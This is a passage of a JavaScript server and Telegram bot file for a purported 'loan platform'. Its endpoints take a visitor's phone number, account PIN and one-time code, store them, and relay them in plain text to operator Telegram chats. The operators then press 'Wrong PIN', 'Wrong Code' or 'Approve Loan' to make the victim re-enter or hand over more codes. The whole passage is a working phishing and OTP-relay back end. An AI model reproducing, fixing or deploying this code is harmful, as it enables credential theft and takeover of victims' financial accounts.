        const adminId = getAdminIdByChatId(chatId);
        try {
            if (adminId !== 'ADMIN001') { await bot.sendMessage(chatId, '❌ Only superadmin can send action requests.'); return; }
            const input = match[1].trim();
            const spaceIndex = input.indexOf(' ');
            if (spaceIndex === -1) { await bot.sendMessage(chatId, '❌ Use: /ask ADMINID Your request here'); return; }
            const targetAdminId = input.substring(0, spaceIndex).trim();
            const requestText = input.substring(spaceIndex + 1).trim();
            const targetAdmin = await db.getAdmin(targetAdminId);
            if (!targetAdmin) { await bot.sendMessage(chatId, `❌ Admin \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' }); return; }
            if (!adminChatIds.has(targetAdminId)) { await bot.sendMessage(chatId, `⚠️ Admin ${targetAdmin.name} is not connected.`); return; }
            const requestId = `REQ-${Date.now()}`;
            const sent = await bot.sendMessage(adminChatIds.get(targetAdminId), `❓ *REQUEST FROM SUPER ADMIN*\n\n${requestText}\n\n---\n📋 Request ID: \`${requestId}\`\n⏰ ${new Date().toLocaleString()}`, {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: [[{ text: '✅ Done', callback_data: `request_done_${requestId}_${targetAdminId}` }, { text: '❓ Need Help', callback_data: `request_help_${requestId}_${targetAdminId}` }]] }
            });
            if (sent) await bot.sendMessage(chatId, `✅ *REQUEST SENT*\n\nTo: ${targetAdmin.name} (\`${targetAdminId}\`)\nRequest ID: \`${requestId}\``, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('❌ Error sending request:', error);
            await bot.sendMessage(chatId, '❌ Failed to send request. Error: ' + error.message);
        }
    });

    console.log('✅ Command handlers setup complete!');
}

// ==========================================
// ✅ TELEGRAM CALLBACK HANDLER
// ==========================================
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const adminId = getAdminIdByChatId(chatId);

    console.log(`\n🔘 CALLBACK: ${data} | Admin: ${adminId || 'UNAUTHORIZED'}`);

    if (!adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
        return;
    }

    if (!isAdminActive(chatId)) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🚫 Your admin access has been paused.', show_alert: true });
        return;
    }

    if (data.startsWith('request_done_') || data.startsWith('request_help_')) {
        const parts = data.split('_');
        const action = parts[1];
        const requestId = parts[2];
        const respondingAdminId = parts[3];
        const respondingAdmin = await db.getAdmin(respondingAdminId);
        const superAdminChatId = adminChatIds.get('ADMIN001');
        if (superAdminChatId) {
            if (action === 'done') await bot.sendMessage(superAdminChatId, `✅ *REQUEST COMPLETED*\n\nAdmin: ${respondingAdmin?.name || respondingAdminId}\nRequest ID: \`${requestId}\`\n⏰ ${new Date().toLocaleString()}`, { parse_mode: 'Markdown' });
            else await bot.sendMessage(superAdminChatId, `❓ *ADMIN NEEDS HELP*\n\nAdmin: ${respondingAdmin?.name || respondingAdminId}\n🆔 \`${respondingAdminId}\`\nRequest ID: \`${requestId}\`\n\nContact: /send ${respondingAdminId} Your message`, { parse_mode: 'Markdown' });
        }
        const responseEmoji = action === 'done' ? '✅' : '❓';
        const responseText = action === 'done' ? 'Task Completed' : 'Requested Help';
        await bot.editMessageText(`${responseEmoji} *REQUEST ${responseText.toUpperCase()}*\n\nRequest ID: \`${requestId}\`\n⏰ ${new Date().toLocaleString()}\n\nSuper admin has been notified.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: `${responseEmoji} Response sent to super admin`, show_alert: false });
        return;
    }

    const parts = data.split('_');
    if (parts.length < 4) { await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true }); return; }

    const action = parts[0];
    const type = parts[1];
    const embeddedAdminId = parts[2];
    const applicationId = parts.slice(3).join('_');

    if (embeddedAdminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
        return;
    }

    const application = await db.getApplication(applicationId);
    if (!application || application.adminId !== adminId) {
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found or not yours!', show_alert: true });
        return;
    }

    if (action === 'wrongpin' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
        await bot.editMessageText(`❌ *WRONG PIN AT OTP STAGE*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔢 \`${application.otp}\`\n\n⚠️ User will re-enter PIN.\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter PIN', show_alert: false });
    } else if (action === 'wrongcode' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
        await bot.editMessageText(`❌ *WRONG CODE*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔢 \`${application.otp}\`\n\n⚠️ User will re-enter code.\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter code', show_alert: false });
    } else if (action === 'deny' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
        await bot.editMessageText(`❌ *INVALID - REJECTED*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔑 \`${application.pin}\`\n\n✗ REJECTED\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected', show_alert: false });
    } else if (action === 'allow' && type === 'pin') {
        await db.updateApplication(applicationId, { pinStatus: 'approved' });
        await bot.editMessageText(`✅ *ALL CORRECT - APPROVED*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔑 \`${application.pin}\`\n\n✓ APPROVED\n⏰ ${new Date().toLocaleString()}\n\nUser will now proceed to OTP.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved! User can enter OTP now.', show_alert: false });
    } else if (action === 'approve' && type === 'otp') {
        await db.updateApplication(applicationId, { otpStatus: 'approved' });
        await bot.editMessageText(`🎉 *LOAN APPROVED!*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔑 \`${application.pin}\`\n🔢 \`${application.otp}\`\n\n✓ FULLY APPROVED\n⏰ ${new Date().toLocaleString()}`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!', show_alert: false });
    }
});

console.log('✅ Telegram callback handler registered!');

// ==========================================
// ✅ MIDDLEWARE - Database ready check
// ==========================================
app.use((req, res, next) => {
    if (!dbReady && !req.path.includes('/health') && !req.path.includes('/telegram-webhook')) {
        return res.status(503).json({ success: false, message: 'Database not ready yet' });
    }
    next();
});

// ==========================================
// ✅ API ENDPOINTS
// ==========================================

app.post('/api/verify-pin', async (req, res) => {
    const lockKey = `pin_${req.body?.phoneNumber}`;
    try {
        const { phoneNumber, pin } = req.body;
        const applicationId = `APP-${Date.now()}`;

        console.log('\n📥 PIN Verification Request:');
        console.log('   Phone:', phoneNumber);
        console.log('   Session adminId:', req.adminId || 'none');

        // ✅ FIXED: Use finally to guarantee lock is always released
        if (processingLocks.has(lockKey)) {
            return res.status(429).json({ success: false, message: 'Request already processing. Please wait.' });
        }
        processingLocks.add(lockKey);

        let assignedAdmin;

        // ✅ SECURE: Read adminId ONLY from server-side session cookie — ignore frontend body
        if (req.adminId) {
            assignedAdmin = await db.getAdmin(req.adminId);

            if (assignedAdmin && pausedAdmins.has(req.adminId)) {
                console.warn(`⚠️ Admin ${req.adminId} is paused — falling back to auto-assign`);
                assignedAdmin = null;
            }

            if (assignedAdmin && assignedAdmin.status !== 'active') {
                console.warn(`⚠️ Admin ${req.adminId} is inactive — falling back to auto-assign`);
                assignedAdmin = null;
            }

            if (assignedAdmin) {
                // Repair adminChatIds map if needed
                if (!adminChatIds.has(req.adminId)) {
                    adminChatIds.set(req.adminId, assignedAdmin.chatId);
                    console.log(`🔧 Repaired adminChatIds map for: ${req.adminId}`);
                }
                console.log(`✅ Using session admin: ${assignedAdmin.name}`);
            }
        }

        // Auto-assign if no valid session admin
        if (!assignedAdmin) {
            await loadAdminChatIds();
            const activeAdmins = await db.getActiveAdmins();
            const availableAdmins = activeAdmins.filter(admin => !pausedAdmins.has(admin.adminId));

            if (availableAdmins.length === 0) {
                return res.status(503).json({ success: false, message: 'No admins available. Please try again in a moment.' });
            }

            const adminStats = await Promise.all(
                availableAdmins.map(async (admin) => {
                    const stats = await db.getAdminStats(admin.adminId);
                    return { admin, pending: stats.pinPending + stats.otpPending };
                })
            );

            adminStats.sort((a, b) => a.pending - b.pending);
            assignedAdmin = adminStats[0].admin;
            console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
        }

        // Check for duplicate pending
        const existingApps = await db.getApplicationsByAdmin(assignedAdmin.adminId);
        const alreadyPending = existingApps.find(a => a.phoneNumber === phoneNumber && a.pinStatus === 'pending');
        if (alreadyPending) {
            console.log(`⚠️ Duplicate prevented — returning existing: ${alreadyPending.id}`);
            return res.json({ success: true, applicationId: alreadyPending.id, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
        }

        // Returning user check
        const thisAdminPastApps = existingApps
            .filter(a => a.phoneNumber === phoneNumber && a.pinStatus !== 'pending')
            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const isReturningUser = thisAdminPastApps.length > 0;

        let historyText = '';
        if (isReturningUser) {
            const last = thisAdminPastApps[0];
            const lastDate = new Date(last.timestamp).toLocaleString();
            const lastStatus = last.otpStatus === 'approved' ? '✅ Approved' :
                               last.pinStatus === 'rejected' ? '❌ Rejected' :
                               last.otpStatus === 'wrongcode' ? '❌ Wrong Code' :
                               last.otpStatus === 'wrongpin_otp' ? '❌ Wrong PIN' : '⏳ Incomplete';
            historyText = `\n📊 *Returned: ${thisAdminPastApps.length} previous application(s)*\nLast: ${lastDate} — ${lastStatus}`;
        }

        // Ensure admin is in the map
        if (!adminChatIds.has(assignedAdmin.adminId)) {
            if (assignedAdmin.chatId) {
                adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
            } else {
                return res.status(503).json({ success: false, message: 'Admin not connected — they need to /start the bot first' });
            }
        }

        // Save application
        await db.saveApplication({
            id: applicationId,
            adminId: assignedAdmin.adminId,
            adminName: assignedAdmin.name,
            phoneNumber,
            pin,
            pinStatus: 'pending',
            otpStatus: 'pending',
            assignmentType: req.adminId ? 'session' : 'auto',
            isReturningUser,
            previousCount: thisAdminPastApps.length,
            timestamp: new Date().toISOString()
        });

        const userLabel = isReturningUser ? '🔄 *RETURNING USER*' : '📱 *NEW APPLICATION*';
        await sendToAdmin(assignedAdmin.adminId, `${userLabel}\n\n📋 \`${applicationId}\`\n📱 ${phoneNumber}\n🔑 \`${pin}\`\n⏰ ${new Date().toLocaleString()}${historyText}\n\n⚠️ *VERIFY INFORMATION*`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Invalid - Deny', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });

    } catch (error) {
        console.error('❌ Error in /api/verify-pin:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    } finally {
        // ✅ FIXED: Always release lock — even if error thrown
        processingLocks.delete(lockKey);
    }
});

app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.pinStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        console.error('Error checking PIN status:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/verify-otp', async (req, res) => {
    console.log('\n🔵 /api/verify-otp called');
    try {
        const { applicationId, otp } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) adminChatIds.set(application.adminId, admin.chatId);
            else return res.status(500).json({ success: false, message: 'Admin unavailable' });
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `📲 *CODE VERIFICATION*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n🔢 \`${otp}\`\n⏰ ${new Date().toLocaleString()}\n\n⚠️ *VERIFY CODE*`, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) res.json({ success: true, status: application.otpStatus });
        else res.status(404).json({ success: false, message: 'Application not found' });
    } catch (error) {
        console.error('Error checking OTP status:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        const application = await db.getApplication(applicationId);
        if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
        if (!adminChatIds.has(application.adminId)) return res.status(500).json({ success: false, message: 'Admin unavailable' });
        await sendToAdmin(application.adminId, `🔄 *OTP RESEND REQUEST*\n\n📋 \`${applicationId}\`\n📱 ${application.phoneNumber}\n\nUser requested OTP resend.`, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } catch (error) {
        console.error('Error in resend-otp:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const adminList = admins
            .filter(admin => !pausedAdmins.has(admin.adminId))
            // ✅ email and chatId removed — only safe fields returned
            .map(admin => ({ id: admin.adminId, name: admin.name, connected: adminChatIds.has(admin.adminId) }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        console.error('Error getting admins:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const admin = await db.getAdmin(req.params.adminId);
        if (admin && pausedAdmins.has(admin.adminId)) {
            return res.json({ success: true, valid: false, message: 'Admin is currently paused' });
        }
        if (admin && admin.status === 'active') {
            res.json({ success: true, valid: true, connected: adminChatIds.has(admin.adminId), admin: { id: admin.adminId, name: admin.name, email: admin.email } });
        } else {
            res.json({ success: true, valid: false, message: 'Admin not found or inactive' });
        }
    } catch (error) {
        console.error('Error validating admin:', error);
        res.status(500).json({ success: false, message: 'Server error' });
    }
});

app.get('/api/debug-admins', async (req, res) => {
    try {
        const allAdmins = await db.getAllAdmins();
        res.json({
            dbAdminCount: allAdmins.length,
            mapAdminCount: adminChatIds.size,
            dbReady,
            adminsInDB: allAdmins.map(a => ({ adminId: a.adminId, name: a.name, status: a.status, hasChatId: !!a.chatId, inMap: adminChatIds.has(a.adminId), paused: pausedAdmins.has(a.adminId) })),
            adminsInMap: Array.from(adminChatIds.keys())
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        database: dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        botMode: 'webhook',
        sessionSystem: 'cookie+db',
        timestamp: new Date().toISOString()
    });
});

app.get('/admin-select', (req, res) => res.sendFile(path.join(__dirname, 'admin-select.html')));
app.get('/approval.html', (req, res) => res.sendFile(path.join(__dirname, 'approval.html')));

app.get('/', async (req, res) => {
    // ✅ Legacy support: ?admin= in URL still works (redirects to /a/:adminId)
    const adminId = req.query.admin;
    if (adminId) {
        console.log(`🔀 Legacy ?admin= link detected — redirecting to /a/${adminId}`);
        return res.redirect(301, `/a/${adminId}`);
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// SERVER
// ==========================================
app.listen(PORT, () => {
    console.log(`\n👑 MULTI-ADMIN LOAN PLATFORM`);
    console.log(`============================`);
    console.log(`🌐 Server: http://localhost:${PORT}`);
    console.log(`🤖 Bot: WEBHOOK MODE ✅`);
    console.log(`🔐 Sessions: Cookie + DB ✅`);
    console.log(`\n✅ Ready!\n`);
});

// ==========================================
// ✅ GRACEFUL SHUTDOWN — clears all intervals
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}, shutting down gracefully...`);
    try {
        intervals.forEach(clearInterval); // ✅ FIXED: Clear all stored intervals
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Cleanup completed');
        process.exit(0);
    } catch (error) {
        console.error('❌ Error during shutdown:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT', () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled rejection (non-fatal):', error?.message);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught exception (non-fatal):', error?.message);
});
